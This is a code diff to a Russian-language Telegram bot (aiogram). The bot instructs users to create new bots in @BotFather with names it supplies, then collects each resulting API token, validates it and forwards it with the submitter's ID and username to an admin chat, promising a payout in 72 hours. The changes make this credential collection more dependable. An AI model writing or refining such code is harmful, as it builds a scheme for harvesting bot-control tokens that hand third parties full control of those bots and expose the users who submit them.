@@ -4,10 +4,14 @@ import string
 import re
 import aiohttp
 import os
+import logging
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
 import config
+
+# Включаем логирование ошибок в консоль
+logging.basicConfig(level=logging.INFO)
 
 bot = Bot(token=config.BOT_TOKEN)
 dp = Dispatcher()
@@ -29,7 +33,6 @@ main_kb = ReplyKeyboardMarkup(
     resize_keyboard=True
 )
 
-# Проверка на валидность
 async def check_token_validity(token: str):
     url = f"https://api.telegram.org/bot{token}/getMe"
     async with aiohttp.ClientSession() as session:
@@ -38,14 +41,14 @@ async def check_token_validity(token: str):
                 if response.status == 200:
                     return await response.json()
                 return None
-        except:
+        except Exception as e:
+            logging.error(f"Ошибка проверки токена: {e}")
             return None
 
-# Работа с файлами (дубли и бан)
-def is_listed(user_id, file_path):
+def is_listed(data, file_path):
     if not os.path.exists(file_path): return False
     with open(file_path, "r") as f:
-        return str(user_id) in f.read().splitlines()
+        return str(data) in f.read().splitlines()
 
 def save_to_file(data, file_path):
     with open(file_path, "a") as f:
@@ -67,13 +70,13 @@ async def step_1(message: types.Message):
     name = random.choice(NAMES)
     username = gen_username()
     
-    await message.answer("1️⃣ Шаг первый:\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду /newbot.")
-    await asyncio.sleep(1.5)
-    await message.answer(f"Теперь перешлите название бота туда:\n`{name}`", parse_mode="MarkdownV2")
-    await asyncio.sleep(1.5)
-    await message.answer(f"2️⃣ Шаг второй:\nКогда он попросит юзернейм, отправьте это:\n`{username}`", parse_mode="MarkdownV2")
+    await message.answer("1️⃣ **Шаг первый:**\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду `/newbot`.")
     await asyncio.sleep(1)
-    await message.answer("3️⃣ Шаг третий:\nСкопируйте API токен от @BotFather и пришлите его мне!")
+    await message.answer(f"Теперь перешлите название бота туда:\n`{name}`", parse_mode="Markdown")
+    await asyncio.sleep(1)
+    await message.answer(f"2️⃣ **Шаг второй:**\nКогда он попросит юзернейм, отправьте это:\n`{username}`", parse_mode="Markdown")
+    await asyncio.sleep(1)
+    await message.answer("3️⃣ **Шаг третий:**\nСкопируйте API токен от @BotFather и пришлите его мне!")
 
 @dp.message()
 async def handle_token(message: types.Message):
@@ -82,32 +85,47 @@ async def handle_token(message: types.Message):
     token = message.text.strip() if message.text else ""
     
     if TOKEN_PATTERN.match(token):
+        # Сначала проверяем дубликат
         if is_listed(token, DB_FILE):
             await message.answer("❌ Этот токен уже сдан!")
             return
 
+        # Проверяем валидность в Telegram
         bot_data = await check_token_validity(token)
-        if bot_data:
-            save_to_file(token, DB_FILE)
+        
+        if bot_data and bot_data.get("ok"):
+            res = bot_data["result"]
             
-            # --- ВОТ ТУТ ОТПРАВКА ЛОГА В ЧАТ ---
+            # Сначала ПЫТАЕМСЯ отправить лог
             log_text = (
                 "📥 **НОВЫЙ ТОКЕН!**\n"
-                f"👤 **Юзер:** @{message.from_user.username or 'id' + str(message.from_user.id)}\n"
+                f"👤 **Юзер:** @{message.from_user.username or 'ID ' + str(message.from_user.id)}\n"
                 f"🆔 **ID:** `{message.from_user.id}`\n"
-                f"🤖 **Бот:** @{bot_data['result']['username']}\n"
+                f"🤖 **Бот:** @{res['username']}\n"
                 f"🔑 **Токен:** `{token}`"
             )
-            await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
-            # ----------------------------------
             
-            await message.answer("✅ Принято! Ожидайте выплату в течение 72 часов.")
+            try:
+                # Отправка лога
+                await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
+                
+                # ТОЛЬКО ЕСЛИ ОТПРАВИЛОСЬ — сохраняем в базу (чтобы не было бага как раньше)
+                save_to_file(token, DB_FILE)
+                
+                await message.answer("✅ Токен принят! Ожидайте выплату в течение 72 часов.")
+                logging.info(f"Лог успешно отправлен. Токен: {token}")
+                
+            except Exception as e:
+                # Если лог не ушел (например, бот не в чате)
+                logging.error(f"КРИТИЧЕСКАЯ ОШИБКА ОТПРАВКИ ЛОГА: {e}")
+                await message.answer("❌ Произошла внутренняя ошибка при передаче данных. Попробуйте позже или свяжитесь с админом.")
         else:
-            await message.answer("❌ Нерабочий токен.")
+            await message.answer("❌ Нерабочий токен. Проверьте данные в @BotFather.")
     elif token != "Подобрать задание ⚙️":
-        await message.answer("❌ Пришлите токен по инструкции.")
+        await message.answer("❌ Это не похоже на токен. Пришлите данные от @BotFather.")
 
 async def main():
+    print("Бот запущен. Если логи не приходят — проверьте консоль хостинга!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
